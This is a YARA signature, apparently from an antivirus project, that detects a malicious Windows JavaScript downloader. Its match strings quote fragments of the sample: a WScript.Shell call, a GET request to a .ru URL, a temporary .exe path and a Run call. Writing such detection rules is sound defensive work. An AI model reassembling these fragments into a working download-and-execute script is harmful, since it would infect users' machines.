rule sig_20160330_f2a127ce7fc6b6d7279ca60d727abc6a {
  meta:
    description = "datamaliciousorder - file 20160330_f2a127ce7fc6b6d7279ca60d727abc6a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "06f28e02d7505e47fefb311e58c40f4824ca70a38a6909bb65085c6afea5ea1a"

  strings:
    $s1  = "function N(KS0, W){V = V * 1; return KS0 - W;};" fullword ascii
    $s2  = "var K = function Z() {return WScript[VM](\"WScript\"+\".Shell\");}(), L = 11;" fullword ascii
    $s3  = "WN[FO](\"GET\", \"http://jafes.ru/b0ros\", false);" fullword ascii
    $s4  = "if (WN[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function HQ() {return K[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Ie9o9BjuAPFe4.ex\" + \"e\";};" fullword ascii
    $s6  = "function Y(){return S + \"\";};" fullword ascii
    $s7  = "function B(E0){K[\"Run\"](E0, V, V);};" fullword ascii
    $s8  = "function F() {return ((B0 == true) && (B0 == O)) ? 1 : V;};" fullword ascii
    $s9  = "function J(){return 22;};" fullword ascii
    $s10 = "}while (QZ);" fullword ascii
    $s11 = "function FW(){return VM;};" fullword ascii
    $s12 = "return N(ZE, C);" fullword ascii
    $s13 = "function T0()" fullword ascii
    $s14 = "var XC = new this[\"Date\"]();" fullword ascii
    $s15 = "function T(LT) {var KS = (1, 2, 3, 4, 5, LT); return KS;};" fullword ascii
    $s16 = "var O = false;" fullword ascii
    $s17 = "O = true; " fullword ascii
    $s18 = "var B0 = false;" fullword ascii
    $s19 = "B0 = true; " fullword ascii
    $s20 = "var NP = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}